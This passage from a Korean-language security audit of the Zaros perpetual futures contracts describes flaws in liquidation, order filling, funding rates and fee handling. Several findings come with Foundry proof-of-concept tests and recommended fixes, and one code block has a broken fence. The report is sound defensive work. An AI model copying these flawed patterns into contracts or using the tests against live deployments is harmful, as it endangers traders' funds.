    perpsEngine.updatePerpMarketStatus({ marketId: BTC_USD_MARKET_ID, enable: false });

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // naruto attmpts to close their opened leverage BTC position but it
    // reverts with PerpMarketDisabled error. However the position is still
    // subject to liquidation!
    //
    // after running this test the first time to verify it reverts with PerpMarketDisabled,
    // comment out this next line then re-run test to see Naruto can be liquidated
    // even though Naruto can't close their open position - very unfair!
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // liquidate naruto - works fine! naruto was liquidated even though
    // they couldn't close their position!
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

실행: `forge test --match-test test_ImpossibleToClosePositionIfMarkedDisabledButStillLiquidatable -vvv`

**권장 완화 방법:** 청산은 항상 가능해야 하므로 비활성화된 시장에서 청산을 방지하는 것은 좋은 생각이 아닙니다. 두 가지 잠재적 옵션:
* 오픈 포지션이 있는 시장 비활성화 방지
* 비활성화된 시장에서 사용자가 오픈 포지션을 닫을 수 있도록 허용

**Zaros:** 커밋 [65b08f0](https://github.com/zaros-labs/zaros-core/commit/65b08f0e6b9187b251dfdc89dda08bc72b06e345)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 청산은 트레이더에게 더 건전하지 않고 위험한 담보 바스켓을 남겨, 향후 거래에서 청산될 가능성을 높임

**설명:** 프로토콜이 제안한 담보 우선순위 대기열과 관련 LTV(Loan-To-Value)는 다음과 같습니다:
```
1 - USDz   - 1e18 LTV
2 - USDC   - 1e18 LTV
3 - WETH   - 0.8e18 LTV
4 - WBTC   - 0.8e18 LTV
5 - wstETH - 0.7e18 LTV
6 - weETH  - 0.7e18 LTV
```

이는 프로토콜이 다음을 수행함을 의미합니다:
* LTV가 높은 더 안정적인 담보를 먼저 청산
* 이들이 소진된 후에만 LTV가 낮은 덜 안정적이고 위험한 담보를 청산

**영향:** 트레이더가 청산되면 남은 담보 바스켓에는 덜 안정적이고 더 위험한 담보가 포함됩니다. 이는 향후 거래에서 청산될 가능성을 높입니다.

**권장 완화 방법:** 담보 우선순위 대기열은 LTV가 낮은 위험하고 변동성이 큰 담보를 먼저 청산해야 합니다.

**Zaros:** 커밋 [5baa628](https://github.com/zaros-labs/zaros-core/commit/5baa628979d6d33ca042dfca2444c4403393b427)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 트레이더가 키퍼가 원래 주문을 처리하기 직전에 오픈 주문을 업데이트할 때, 키퍼가 잘못된 이전 `marketId`를 사용하지만 새로 업데이트된 포지션 크기를 사용하여 시장 주문을 채움

**설명:** 다음 시나리오를 고려하십시오:
1) 트레이더가 포지션 크기 POS_SIZE_A로 BTC 시장에 대한 주문을 생성합니다.
2) 시간이 지나도 주문이 키퍼에 의해 채워지지 않습니다.
3) 동시에:
3a) 키퍼가 트레이더의 현재 오픈 BTC 주문을 채우려고 시도합니다.
3b) 트레이더가 포지션 크기 POS_SIZE_B로 다른 시장에 대한 주문을 업데이트하는 트랜잭션을 생성합니다.

3b)가 3a)보다 먼저 실행되면 3a)가 실행될 때 키퍼는 주문을 채웁니다:
* 잘못된 이전 BTC 시장에 대해
* 그러나 새로 업데이트된 포지션 크기 POS_SIZE_B로!

**영향:** 키퍼는 잘못된 포지션 크기로 잘못된 시장에 대한 주문을 채우게 됩니다.

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 PoC를 추가하십시오:
```solidity
// additional import at top
import { Position } from "@zaros/perpetuals/leaves/Position.sol";

function test_KeeperFillsOrderToIncorrectMarketAfterUserUpdatesOpenOrder() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto creates an open order in the BTC market
    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: BTC_USD_MARKET_ID,
            sizeDelta: USER_POS_SIZE_DELTA
        })
    );

    // some time passes and the order is not filled
    vm.warp(block.timestamp + MARKET_ORDER_MAX_LIFETIME + 1);

    // at the same time:
    // 1) keeper creates a transaction to fill naruto's open BTC order
    // 2) naruto updates their open order to place it on ETH market

    // 2) gets executed first; naruto changes position size and market id
    int128  USER_POS_2_SIZE_DELTA = 5e18;

    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: ETH_USD_MARKET_ID,
            sizeDelta: USER_POS_2_SIZE_DELTA
        })
    );

    // 1) gets executed afterwards - the keeper is calling this
    // with the parameters of the first opened order, in this case
    // with BTC's market id and price !
    bytes memory mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
    changePrank({ msgSender: marketOrderKeepers[BTC_USD_MARKET_ID] });
    perpsEngine.fillMarketOrder(tradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);

    // the keeper filled Naruto's original BTC order even though
    // Naruto had first updated the order to be for the ETH market;
    // Naruto now has an open BTC position. Also it was filled using
    // the *updated* order size!
    changePrank({ msgSender: users.naruto });

    // load naruto's position for BTC market
    Position.State memory positionState = perpsEngine.getPositionState(tradingAccountId, BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE);

    // verify that the position size of the filled BTC position
    // matches the size of the updated ETH order!
    assertEq(USER_POS_2_SIZE_DELTA, positionState.sizeX18.intoInt256());
}
```

실행: `forge test --match-test test_KeeperFillsOrderToIncorrectMarketAfterUserUpdatesOpenOrder -vvv`

**권장 완화 방법:** `settlementBranch::fillMarketOrder`는 `marketId != marketOrder.marketId`인 경우 되돌려야 합니다.

**Zaros:** 커밋 [31a19ef](https://github.com/zaros-labs/zaros-core/commit/31a19ef9113aed94e291160e7eaf5fc399671170#diff-572572bb95cc7c9ffd3c366fe793b714965688505695c496cf74bed94c8cc976R57-R60)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`가 주문 정산 중 잘못된 가격을 사용함

**설명:** 주문 정산 중 `SettlementBranch::_fillOrder`는 키퍼가 제공한 오프체인 가격을 사용합니다:

```solidity
File: SettlementBranch.sol
120:         ctx.fillPrice = perpMarket.getMarkPrice(
121:             ctx.sizeDelta, settlementConfiguration.verifyOffchainPrice(priceData, ctx.sizeDelta.gt(SD_ZERO))
122:         );
123:
124:         ctx.fundingRate = perpMarket.getCurrentFundingRate();
125:         ctx.fundingFeePerUnit = perpMarket.getNextFundingFeePerUnit(ctx.fundingRate, ctx.fillPrice);
```

`ctx.fillPrice` 및 `ctx.fundingFeePerUnit`을 포함한 모든 변수는 이 가격을 기준으로 계산됩니다.

그러나 `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`의 증거금 요건 검증 중에는 키퍼가 제공한 가격 입력을 사용하지 않고 대신 인덱스 가격을 사용합니다:

```solidity
File: TradingAccount.sol
207:             UD60x18 markPrice = perpMarket.getMarkPrice(sizeDeltaX18, perpMarket.getIndexPrice());
208:             SD59x18 fundingFeePerUnit =
209:                 perpMarket.getNextFundingFeePerUnit(perpMarket.getCurrentFundingRate(), markPrice);
```

**영향:** `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`의 모든 계산은 키퍼가 제공한 가격이 현재 인덱스 가격과 다를 수 있으므로 올바르지 않을 수 있습니다. 따라서 주문 정산 중 `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`는 잘못된 출력을 반환할 수 있습니다.

**권장 완화 방법:** 주문 정산 중 `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`는 `targetMarketId`에 대해 키퍼가 제공한 것과 동일한 오프체인 가격을 사용해야 합니다.

**Zaros:** 확인됨; 이는 V2에서 리팩토링할 예정입니다. 실제로는 차이가 미미합니다; "최악의 경우" 시나리오에서는 사용자가 초기 증거금 요건보다 약간 부족하더라도 주문이 채워질 수 있습니다. 바람직하지는 않지만 사용자는 유지 증거금에서 즉시 청산 대상이 되지 않으므로 여기서의 영향은 매우 미미해 보입니다.


### 프로토콜 운영자가 오픈 포지션이 있는 시장에 대한 정산을 비활성화할 수 있어, 트레이더가 오픈 포지션을 닫는 것이 불가능하지만 여전히 잠재적인 청산 대상이 됨

**설명:** `GlobalConfiguration::updateSettlementConfiguration`은 해당 시장에 오픈 포지션이 있는지 확인하지 않고 프로토콜 운영자가 시장에 대한 정산을 비활성화할 수 있도록 허용합니다; 이는 운영자가 오픈 포지션이 있는 시장에 대한 정산을 비활성화할 수 있게 합니다.

**영향:** 프로토콜은 이전에 시장에서 레버리지 포지션을 오픈한 트레이더가 이후에 해당 포지션을 닫을 수 없는 상태에 들어갈 수 있습니다. 그러나 정산이 비활성화된 경우에도 청산 코드는 계속 작동하므로 이러한 포지션은 여전히 청산 대상입니다.

따라서 프로토콜은 트레이더가 부당하게 심각한 불이익을 받는 상태에 들어갈 수 있습니다; 그들은 오픈 레버리지 포지션을 닫을 수 없지만 시장이 그들에게 불리하게 움직일 경우 여전히 청산 대상입니다.

**개념 증명 (Proof of Concept):** 다음 PoC를 `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 추가하십시오:
```solidity
// new import at top
import { IVerifierProxy } from "@zaros/external/chainlink/interfaces/IVerifierProxy.sol";

function test_ImpossibleToClosePositionIfSettlementDisabledButStillLiquidatable() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // protocol operator disables settlement for the BTC market
    changePrank({ msgSender: users.owner });

    SettlementConfiguration.DataStreamsStrategy memory marketOrderConfigurationData = SettlementConfiguration
        .DataStreamsStrategy({ chainlinkVerifier: IVerifierProxy(mockChainlinkVerifier), streamId: BTC_USD_STREAM_ID });

    SettlementConfiguration.Data memory marketOrderConfiguration = SettlementConfiguration.Data({
        strategy: SettlementConfiguration.Strategy.DATA_STREAMS_ONCHAIN,
        isEnabled: false,
        fee: DEFAULT_SETTLEMENT_FEE,
        keeper: marketOrderKeepers[BTC_USD_MARKET_ID],
        data: abi.encode(marketOrderConfigurationData)
    });

    perpsEngine.updateSettlementConfiguration(BTC_USD_MARKET_ID,
                                              SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
                                              marketOrderConfiguration);

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // naruto attmpts to close their opened leverage BTC position but it
    // reverts with PerpMarketDisabled error. However the position is still
    // subject to liquidation!
    //
    // after running this test the first time to verify it reverts with SettlementDisabled,
    // comment out this next line then re-run test to see Naruto can be liquidated
    // even though Naruto can't close their open position - very unfair!
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // liquidate naruto - works fine! naruto was liquidated even though
    // they couldn't close their position!
    changePrank({ msgSender: liquidationKeeper });
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

실행: `forge test --match-test test_ImpossibleToClosePositionIfSettlementDisabledButStillLiquidatable -vvv`

**권장 완화 방법:** 청산은 항상 가능해야 하므로 정산이 비활성화된 경우 청산을 방지하는 것은 좋은 생각이 아닙니다. 두 가지 잠재적 옵션:
* 오픈 포지션이 있는 시장에 대한 정산 비활성화 방지
* 정산이 비활성화된 시장에서 사용자가 오픈 포지션을 닫을 수 있도록 허용

**Zaros:** 커밋 [08d96cf](https://github.com/zaros-labs/zaros-core/commit/08d96cf40c92470454afd4f261b3bc1921845e58)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 펀딩 비율 매개변수에 대한 업데이트가 누적된 펀딩 비율에 소급적으로 영향을 미침

**설명:** 중앙 집중식 무기한 선물 프로토콜에서 펀딩 비율은 일반적으로 8시간마다 정산되지만, Zaros에서는 "누적"되며 트레이더가 자신의 포지션과 상호 작용할 때 정산됩니다. 프로토콜 소유자는 펀딩 비율 매개변수를 변경할 권한도 가지고 있으며, 변경 시 소급적으로 적용됩니다.

**영향:** 포지션을 자주 수정하지 않는 트레이더는 펀딩 비율 매개변수 변경으로 인해 긍정적이거나 부정적인 소급적 영향을 받을 수 있습니다. 트레이더는 현재 구성 매개변수에서 펀딩 비율을 적립하고 있다는 인상을 받기 때문에 소급 적용은 트레이더에게 불공정합니다.

**개념 증명 (Proof of Concept):** 다음 PoC를 `test/integration/order-branch/createMarketOrder/createMarketOrder.t.sol`에 추가하십시오:
```solidity
function test_configChangeRetrospectivelyImpactsAccruedFundingRates() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto keeps their position open for 1 week
    vm.warp(block.timestamp + 1 weeks);

    // snapshot EVM state at this point
    uint256 snapshotId = vm.snapshot();

    // naruto closes their BTC position
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken),
        perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256());

    // verify that naruto has lost $ due to order/settlement fees
    // and paying funding rate
    uint256 firstEndBalance = usdToken.balanceOf(users.naruto); // 99122 456325000000000000
    assertEq(99122456325000000000000, firstEndBalance);

    // restore EVM state to snapshot
    vm.revertTo(snapshotId);

    // right before naruto closes their position, protocol admin
    // changes parameters which affect the funding rates
    GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams memory params =
        GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams({
        marketId: BTC_USD_MARKET_ID,
        name: marketsConfig[BTC_USD_MARKET_ID].marketName,
        symbol: marketsConfig[BTC_USD_MARKET_ID].marketSymbol,
        priceAdapter: marketsConfig[BTC_USD_MARKET_ID].priceAdapter,
        initialMarginRateX18: marketsConfig[BTC_USD_MARKET_ID].imr,
        maintenanceMarginRateX18: marketsConfig[BTC_USD_MARKET_ID].mmr,
        maxOpenInterest: marketsConfig[BTC_USD_MARKET_ID].maxOi,
        maxSkew: marketsConfig[BTC_USD_MARKET_ID].maxSkew,
        // protocol admin increases max funding velocity
        maxFundingVelocity: BTC_USD_MAX_FUNDING_VELOCITY * 10,
        minTradeSizeX18: marketsConfig[BTC_USD_MARKET_ID].minTradeSize,
        skewScale: marketsConfig[BTC_USD_MARKET_ID].skewScale,
        orderFees: marketsConfig[BTC_USD_MARKET_ID].orderFees
    });

    changePrank({ msgSender: users.owner });
    perpsEngine.updatePerpMarketConfiguration(params);

    // naruto then closes their BTC position
    changePrank({ msgSender: users.naruto });

    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken),
        perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256());

    // verify that naruto has lost $ due to order/settlement fees
    // and paying funding rate
    uint256 secondEndBalance = usdToken.balanceOf(users.naruto); // 98460 923250000000000000
    assertEq(98460923250000000000000, secondEndBalance);

    // the update to the funding configuration parameter was
    // applied retrospectively increasing the funding rate
    // naruto had to pay for holding their position the entire
    // time - rather unfair!
    assert(secondEndBalance < firstEndBalance);
}
```

실행: `forge test --match-test test_configChangeRetrospectivelyImpactsAccruedFundingRates -vvv`

**권장 완화 방법:** 이상적으로는 펀딩 비율이 8시간마다와 같이 정기적인 간격으로 정산되어야 하며, 프로토콜 소유자가 주요 펀딩 비율 매개변수를 변경하기 전에 모든 오픈 포지션에 대한 펀딩 비율이 먼저 정산되어야 합니다.

그러나 이는 탈중앙화 시스템에서는 실현 불가능할 수 있습니다.

**Zaros:** 확인됨.


### PNL이 양수이면 `SettlementBranch::_fillOrder`가 주문 및 정산 수수료를 지불하지 않음

**설명:** `SettlementBranch::_fillOrder`는 L161에서 PNL을 계산하는 동안 계산된 PNL에서 이러한 수수료를 공제하지만, L204 주변에서 나중에 PNL이 양수이면 적절한 수수료 수취인에게 주문 및 정산 수수료를 지불하지 않습니다.

```solidity
File: SettlementBranch.sol
159:         ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
160:             oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
161:         ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
...
204:         } else if (ctx.pnl.gt(SD_ZERO)) {
205:             UD60x18 amountToIncrease = ctx.pnl.intoUD60x18();
206:             tradingAccount.deposit(ctx.usdToken, amountToIncrease);
```

**영향:** 주문 및 정산 수수료 수취인은 의도한 것보다 적은 자금을 받게 됩니다.

**권장 완화 방법:** `SettlementBranch::_fillOrder`는 PNL이 양수일 때 적절한 수취인에게 주문 및 정산 수수료를 지불해야 합니다.

**Zaros:** 커밋 [516bc2a](https://github.com/zaros-labs/zaros-core/commit/516bc2ad61d64e94654db500a93bd19567ca01e5)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 낮은 위험 (Low Risk)


### `TradingAccount::deductAccountMargin`이 출력 매개변수 `marginDeductedUsdX18`에 동일한 값을 여러 번 잘못 추가할 수 있음

**설명:** `TradingAccount::deductAccountMargin`의 `for` 루프 내에서 `ctx.settlementFeeDeductedUsdX18`, `ctx.orderFeeDeductedUsdX18`, `ctx.pnlDeductedUsdX18`이 `marginDeductedUsdX18`에 추가됩니다:
```solidity
File: TradingAccount.sol
443:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.settlementFeeDeductedUsdX18);
458:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18);
475:             marginDeductedUsdX18 = marginDeductedUsdX18.add(ctx.pnlDeductedUsdX18);
```

**영향:** 이 3가지 값은 누적된 출금 담보 금액이므로 동일한 금액이 여러 번 추가되어 `marginDeductedUsdX18`이 예상보다 커질 것입니다.

**개념 증명 (Proof of Concept):** 다음 시나리오를 고려하십시오:
* 정산 수수료 `if` 문이 `ctx.isMissingMargin == false`로 한 번 실행됨
* 이것은 `marginDeductedUsdX18`을 `ctx.settlementFeeDeductedUsdX18`만큼 증가시킴
* 주문 수수료 `if` 문이 `ctx.isMissingMargin == true`로 한 번 실행됨
* 이것은 다음 루프 반복으로 즉시 점프하는 `continue`를 트리거함
* 정산 수수료가 지불되었으므로 정산 수수료 `if` 문은 건너뜀
* `marginDeductedUsdX18`이 다시 `ctx.settlementFeeDeductedUsdX18`만큼 증가함!

이 시나리오에서 `marginDeductedUsdX18`은 `ctx.settlementFeeDeductedUsdX18`에 의해 두 번 증가했습니다. `ctx.orderFeeDeductedUsdX18`에서도 동일한 일이 발생할 수 있습니다.

**권장 완화 방법:** 루프 내부 대신 함수 끝에서 `marginDeductedUsdX18`을 업데이트하십시오:

```solidity
function deductAccountMargin() {
    for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {
        /* snip: loop processing */
        // @audit removed updates to `marginDeductedUsdX18` during loop
    }

    // @audit update `marginDeductedUsdX18` only once at end of loop
    marginDeductedUsdX18 = ctx.settlementFeeDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18).add(ctx.pnlDeductedUsdX18);
}
```

**Zaros:** 커밋 [9bcf9f8](https://github.com/zaros-labs/zaros-core/commit/9bcf9f83d11d8da9113c38f01404985f37dc763d)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 메이커/테이커 수수료가 음수인 시장에서 PNL이 음수인 포지션에 대해 `SettlementBranch::_fillOrder`가 되돌려질(revert) 수 있음

**설명:** `SettlementBranch::_fillOrder`는 포지션의 PNL을 `pnl = (unrealizedPnl + accruedFunding) + (unary(orderFee + settlementFee))`로 계산합니다:

```solidity
File: SettlementBranch.sol
141: ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
142:     oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
143:     ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
144:
```

PNL이 음수이면 `marginToDeductUsdX18`은 정산/주문 수수료를 차감하여 계산됩니다.

```solidity
171: if (ctx.pnl.lt(SD_ZERO)) {
172:     UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
173:     ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
174:     : ctx.pnl.abs().intoUD60x18();
175:
176:     tradingAccount.deductAccountMargin({
177:         feeRecipients: FeeRecipients.Data({
178:         marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
179:         orderFeeRecipient: globalConfiguration.orderFeeRecipient,
180:         settlementFeeRecipient: globalConfiguration.settlementFeeRecipient
181:     }),
182:     pnlUsdX18: marginToDeductUsdX18,
183:     orderFeeUsdX18: ctx.orderFeeUsdX18.gt(SD_ZERO) ? ctx.orderFeeUsdX18.intoUD60x18() : UD_ZERO,
184:     settlementFeeUsdX18: ctx.settlementFeeUsdX18
185:     });
```

L183에서 볼 수 있듯이, `orderFeeUsdX18`이 음수일 수 있다고 가정하는데, 이는 `makerFee/takerFee`가 음수일 때만 가능합니다.

그러나 L173의 계산 중에 `orderFeeUsdX18`을 `UD60x18`로 직접 변환하며, 음수 주문 수수료일 경우 되돌려집니다.

```solidity
/// @notice Casts an SD59x18 number into UD60x18.
/// @dev Requirements:
/// - x must be positive.
function intoUD60x18(SD59x18 x) pure returns (UD60x18 result) {
    int256 xInt = SD59x18.unwrap(x);
    if (xInt < 0) {
        revert CastingErrors.PRBMath_SD59x18_IntoUD60x18_Underflow(x);
    }
    result = UD60x18.wrap(uint256(xInt));
}
```

이 되돌림(revert)이 발생하지 않았다면 `marginToDeductUsdX18`의 계산은 올바르지 않았을 것입니다:
```
Normal Case - positive order fee
================================
```
일반적인 경우 - 양수 주문 수수료
================================

미실현 PnL + 누적 펀딩 = -1000, 주문 수수료(USD) = 100, 정산 수수료(USD) = 200

ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
    oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));

ctx.pnl = -1000 + (unary(100 + 200))
        = -1000 + (unary(300))
        = -1000 - 300
        = -1300

=> ctx.pnl이 주문 및 정산 수수료의 합계만큼 증가함 (손실 증가 의미)


UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
    ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
    : ctx.pnl.abs().intoUD60x18();

marginToDeductUsdX18 = ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
                     = 1300 - (100 + 200)
                     = 1300 - 300
                     = 1000

=> marginToDeductUsdX18이 원래의 미실현 PnL + 누적 펀딩과 동일함


극단적 경우 - 음수 주문 수수료
==============================

미실현 PnL + 누적 펀딩 = -1000, 주문 수수료(USD) = -100, 정산 수수료(USD) = 200

ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
    oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));


ctx.pnl = -1000 + (unary(-100 + 200))
        = -1000 + (unary(100))
        = -1000 - 100
        = -1100

=> ctx.pnl이 주문 수수료와 정산 수수료 간의 차이만큼 감소함 (손실 감소 의미)

UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
    ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
    : ctx.pnl.abs().intoUD60x18();

marginToDeductUsdX18 = ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
                     = 1100 - (100 + 200) // -100 주문 수수료는 되돌려지지(reverting) 않는 `intoUD60x18`로 인해 100이 됨
                     = 1100 - 300
                     = 800

=> marginToDeductUsdX18이 공제되어야 할 금액보다 훨씬 낮음
```

**영향:** `SettlementBranch::_fillOrder`가 예상치 못하게 되돌려질(revert) 수 있습니다.

**권장 완화 방법:** '`SettlementBranch::_fillOrder`가 음수 PNL의 절댓값이 주문 및 정산 수수료의 합보다 작으면 되돌려짐(revert)'이라는 다른 낮은 위험 이슈와 동일한 완화 방법을 가집니다.

**Zaros:** 커밋 [e03228e](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3)에서 더 이상 음수 수수료를 지원하지 않음으로써 수정되었습니다; `makerFee`와 `takerFee`는 이제 모두 부호가 없습니다(unsigned).

**Cyfrin:** 확인됨.


### `LiquidationBranch::liquidateAccounts`에서 청산 시 최대 미결제 약정(max open interest) 확인 제거

**설명:** `LiquidationBranch::liquidateAccounts`에서 `PerpMarket::checkOpenInterestLimits`를 호출할 이유가 없습니다. 그 이유는 다음과 같습니다:
* 청산은 항상 미결제 약정을 감소시키므로 청산이 최대 미결제 약정 한도를 위반할 수 없습니다.
* 스큐(skew) 확인이 수행되지 않습니다.

따라서 청산 시 이 확인은 필요하지 않습니다. 이 확인이 있을 때의 위험은 관리자가 최대 미결제 약정 한도를 현재 미결제 약정보다 낮게 설정하면 모든 청산이 되돌려진다는(revert) 것입니다.

**권장 완화 방법:**
```diff
- (ctx.newOpenInterestX18, ctx.newSkewX18) = perpMarket.checkOpenInterestLimits(
-     ctx.liquidationSizeX18, ctx.oldPositionSizeX18, sd59x18(0), false
- );
```

**Zaros:** 커밋 [783ea67](https://github.com/zaros-labs/zaros-core/commit/783ea67979b79bce3a74dbaf19e53503034c9349)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 무기한 시장의 `maxOpenInterest`가 현재 미결제 약정보다 작게 업데이트되는 상태를 적절하게 처리

**설명:** `GlobalConfigurationBranch::updatePerpMarketConfiguration`은 `maxOpenInterest != 0`인지만 확인한 다음 `MarketConfiguration::update`를 호출하여 `maxOpenInterest`를 임의의 0이 아닌 값으로 설정합니다.

이는 프로토콜 관리자가 `maxOpenInterest`를 현재 미결제 약정보다 작게 업데이트할 수 있음을 의미합니다. 이러한 상태는 `PerpMarket::checkOpenInterestLimits`의 확인으로 인해 청산을 포함한 해당 시장의 많은 트랜잭션을 실패하게 만듭니다.

**권장 완화 방법:** 첫 번째 옵션은 `maxOpenInterest`가 현재 미결제 약정보다 작게 업데이트되지 않도록 방지하는 것입니다. 그러나 예를 들어 프로토콜 관리자가 현재 시장의 규모를 줄여 노출을 제한하려는 경우와 같이 이를 수행해야 할 타당한 이유가 있을 수 있습니다.

따라서 다른 옵션은 `PerpMarket::checkOpenInterestLimits`의 확인을 `skew` 확인과 유사하게 수정하는 것입니다; 즉, 감소된 값이 현재 구성된 `maxOpenInterest`보다 크더라도 현재 미결제 약정을 줄이는 트랜잭션이라면 허용하는 것입니다.

**Zaros:** 커밋 [8a3436c](https://github.com/zaros-labs/zaros-core/commit/8a3436ca522587b9ae631a65ae7f8343ce536e71)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `MarketOrder` 최소 수명(minimum lifetime)을 쉽게 우회할 수 있음

